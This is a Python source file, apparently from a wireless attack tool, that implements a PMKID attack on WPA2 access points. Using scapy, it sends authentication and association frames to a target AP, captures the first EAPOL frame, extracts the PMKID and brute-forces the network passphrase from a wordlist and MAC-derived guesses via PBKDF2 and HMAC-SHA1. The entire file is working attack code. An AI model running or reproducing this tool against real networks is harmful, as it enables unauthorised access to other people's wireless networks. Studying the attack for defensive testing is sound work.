from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Raw
from scapy.layers.dot11 import Dot11Auth
from scapy.layers.dot11 import Dot11AssoReq
from scapy.layers.dot11 import Dot11AssoResp
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Elt
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from utils.macers import org
from pbkdf2 import PBKDF2
from utils import org
from scapy.arch import get_if_raw_hwaddr
try:
	from scapy.layers.eap import EAPOL
except:
	from scapy.layers.dot11 import EAPOL
import threading
import time
import binascii
import hmac
import hashlib
import string
import sys

class PMKID:

	__AUTH_STATUS = False
	__AUTH_STEP = False

	__ASSO_STATUS = False
	__ASSO_STEP = False

	__EAPOL = 0

	def __init__(self, ap, essid, iface, beacon, _dict, passwords, pull, verbose):
		self.iface = iface
		self.essid = essid
		self.ap = ap
		self.cl = self.get_my_addr(self.iface)
		self.d_passes = self.comp_mac_passes(self.ap)
		self.beacon = beacon
		self.dict = _dict
		self.passwords = passwords
		self.pull = pull
		self.verbose = verbose
		self.retry_limit = 40
		self._randn = 1
		self.auth = self.auth_frame_blueprint(self.ap, self.cl)
		self.asso = self.asso_frame_blueprint(self.ap, self.cl)

	def get_my_addr(self, iface):
		family, hwaddr = get_if_raw_hwaddr(iface)
		hwaddr = binascii.hexlify(hwaddr)
		hwaddr = ':'.join(hwaddr[i:i+2] for i in range(0,12,2))
		return hwaddr

	def hexdump(self, src, length=16, sep='.'):
		DISPLAY = string.digits + string.letters + string.punctuation
		FILTER = ''.join(((x if x in DISPLAY else '.') for x in map(chr, range(256))))
		lines = []
		for c in xrange(0, len(src), length):
			chars = src[c:c+length]
			hex = ' '.join(["%02x" % ord(x) for x in chars])
			if len(hex) > 24:
				hex = "%s %s" % (hex[:24], hex[24:])
			printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
			lines.append("%08x:  %-*s  |%s|\n" % (c, length*3, hex, printable))
		return ''.join(lines)

	def enumerate_asso_fields(self, pkt):
		elts = pkt.getlayer(Dot11Elt)
		__data, count = {}, 0
			
		try:
			while isinstance(elts[count], Dot11Elt):
				if elts[count].ID == 0 or elts[count].ID == 1 or elts[count].ID == 48 or elts[count].ID == 5 or elts[count].ID == 50 or elts[count].ID == 221:    #ESSID #Rates
					__data[ elts[count].ID ] = {'ID': elts[count].ID, 'len': elts[count].len, 'info': elts[count].info}
				count += 1
		except IndexError:
			pass

		return __data

	def auth_frame_blueprint(self, ap, cl):
		return RadioTap() / Dot11(addr1=ap, addr2=cl, addr3=ap) / Dot11Auth(seqnum=1)

	def form_asso_layers(self, efields, _pkt):
		_st_layer = _pkt
		for fie, val in efields.items():
			if fie == 0 or fie == 1 or fie == 5 or fie == 48 or fie ==50 or fie == 221:
				_st_layer = _st_layer / Dot11Elt(ID=val['ID'], len=val['len'], info=val['info'])
		return _st_layer

	def asso_frame_blueprint(self, ap, cl):
		capibility = self.beacon.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
		efields = self.enumerate_asso_fields(self.beacon)
		_pkt = RadioTap() / Dot11(addr1=ap, addr2=cl, addr3=ap) / Dot11AssoReq(cap=capibility, listen_interval=3)
		return self.form_asso_layers(efields, _pkt)

	def auth_sniffer(self, iface):
		try:
			self.__AUTH_STATUS = True
			sniff(iface=iface, prn=self.get_auth_resp)
		except ValueError:
			pass
		finally:
			self.__AUTH_STATUS = False

	def get_auth_resp(self, pkt):
		if pkt.haslayer(RadioTap):
			if pkt.haslayer(Dot11Auth):
				sn = pkt.getlayer(Dot11).addr2.replace(':', '')
				rc = pkt.getlayer(Dot11).addr1.replace(':', '')
				if rc == self.cl.replace(':', '') and sn == self.ap.replace(':', ''):
					self.pull.info("1 Frames %s > %s %s[Open Authentication]%s" % (self.ap.replace(':', '').upper(),\
													 self.cl.replace(':', '').upper(), self.pull.YELLOW, self.pull.END))
					if self.verbose:
						self.pull.info("Authentication with Access Point %s[SuccessFull]%s" % (self.pull.GREEN, self.pull.END) )

					self.__AUTH_STEP = bool(1)
					raise ValueError

	def dev_conn(self):
		auth_catcher = threading.Thread(target=self.auth_sniffer, args=(self.iface,), name="Authentication Catcher")
		auth_catcher.daemon = True
		auth_catcher.start()
		
		while not self.__AUTH_STEP:
			self._randn_(3)
			self.pull.up("%i Frames %s > %s %s[Open Authentication]%s" % (self._randn, self.cl.replace(':', '').upper(), self.ap.replace(':', '').upper(), self.pull.BLUE, self.pull.END))
			sendp(self.auth, iface=self.iface, count=2, verbose=False)
			if not self.__AUTH_STATUS:
				break
			time.sleep(1)

		return self.__AUTH_STEP

	def asso_sniffer(self, iface):
		try:
			self.__ASSO_STATUS = True
			sniff(iface=iface, prn=self.get_asso_resp)
		except ValueError:
			pass
		finally:
			self.__ASSO_STATUS = False

	def get_asso_resp(self, pkt):
		if pkt.haslayer(Dot11AssoResp):
			if pkt.getlayer(Dot11AssoResp).status == 0:
				sn = pkt.getlayer(Dot11).addr2.replace(':', '')
				rc = pkt.getlayer(Dot11).addr1.replace(':', '')
				if rc == self.cl.replace(':', '') and sn == self.ap.replace(':', ''):
					self.pull.info("1 Frames %s > %s %s[Association Response]%s" % (self.ap.replace(':', '').upper(),\
													 self.cl.replace(':', '').upper(), self.pull.YELLOW, self.pull.END))
					if self.verbose:
						self.pull.info("Association with Access Point %s[SuccessFull]%s" % (self.pull.GREEN, self.pull.END) )
						self.pull.info("Waiting For EAPOL to initate...")

		if pkt.haslayer(EAPOL):
			sn = pkt.getlayer(Dot11).addr2.replace(':', '')
			nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90]
			mic = binascii.hexlify(pkt.getlayer(Raw).load)[154:186]
			fNONCE = "0000000000000000000000000000000000000000000000000000000000000000"
			fMIC = "00000000000000000000000000000000"
			if sn == self.ap.replace(':', '') and nonce != fNONCE and mic == fMIC:
				self.__ASSO_STEP = True
				self.pull.up("EAPOL %s > %s %s[1 of 4]%s" % (self.ap.replace(':', '').upper(), self.cl.replace(':', '').upper(),\
															 self.pull.BOLD+self.pull.GREEN, self.pull.END) )
				if self.verbose:
					self.pull.info("Successfull handshake initiated [%s]" % org(self.ap).org)
				self.__EAPOL = pkt
				raise ValueError

	def asso_conn(self):
		if not self.__ASSO_STATUS:
			asso_catcher = threading.Thread(target=self.asso_sniffer, args=(self.iface,), name="Association Depender")
			asso_catcher.daemon = True
			asso_catcher.start()

		_retry = 0

		while not self.__ASSO_STEP:
			self._randn_(4)
			self.pull.up("%i Frames %s > %s %s[Association Request]%s" % (self._randn, self.cl.replace(':', '').upper(), self.ap.replace(':', '').upper(), self.pull.BLUE, self.pull.END))
			sendp(self.asso, iface=self.iface, count=1, verbose=False)
			time.sleep(2); _retry += 1
			if _retry >= self.retry_limit:
				self.pull.right("Maximum Limit Reached for Association Requests.")
				self.pull.info("Sleeping! Would restart the process in 30 seconds. ")
				time.sleep(30)
				break

		return self.__ASSO_STEP

	def comp_mac_passes(self, mac):
		list__ = list()
		list__.append(mac.replace(':', '').lower()[:8])
		list__.append(mac.replace(':', '').upper()[:8])
		list__.append(mac.replace(':', '').lower()[4:])
		list__.append(mac.replace(':', '').upper()[4:])
		return list__

	def printing_pass(self, p_pass, c_pass):
		len_A, len_B = len(p_pass), len(c_pass)
		if len_A != 0:
			if len_A > len_B:
				return c_pass + ( " "*(len_A - len_B) )
			else:
				return c_pass
		else:
			return c_pass

	def crack(self):
		fPMKID = '00000000000000000000000000000000'
		PMKID = binascii.hexlify(self.__EAPOL.getlayer(Raw).load)[202:234]
		if PMKID != fPMKID and PMKID != '':
			self.pull.up("PMKID Located (%s)" % PMKID)
			_pmk = self.crack_the_pmk(PMKID)
			return _pmk
		else:
			self.pull.error("The target AP doesn't contain PMKID field. Not Vulnerable. Try with handshake. ")
			sys.exit(0)

	def crack_the_pmk(self, _hash):
		if type(self.passwords) == str:
			_pass_list = self.passwords.split(',')
		else:
			_file = open(self.dict, 'r')
			_pass_list = self.d_passes+_file.read().splitlines()
			_file.close()

		_last_pass = ''

		for _pass in _pass_list:
			self.pull.up("Currently Checking: %s%s%s" % (self.pull.BOLD, self.printing_pass(_last_pass, _pass.rstrip('\n')), self.pull.END))
			_last_pass = _pass.rstrip('\n')
			_pmk = PBKDF2(_pass, self.essid, 4096).read(32)
			_ap = binascii.a2b_hex(self.ap.replace(':', '').lower())
			_cl = binascii.a2b_hex(self.cl.replace(':', '').lower())
			_pmk_fs = "PMK Name"
			_hash_ = hmac.new(_pmk, _pmk_fs+_ap+_cl, hashlib.sha1).hexdigest()[:32]
			if _hash == _hash_:
				return (_pass, self.hexdump(_pmk), self.hexdump(_hash_))
			else:
				self.pull.lineup()

		return (None, '', '')

	def _randn_(self, _max):
		self._randn = org().randomness(_max, self._randn)
		return
		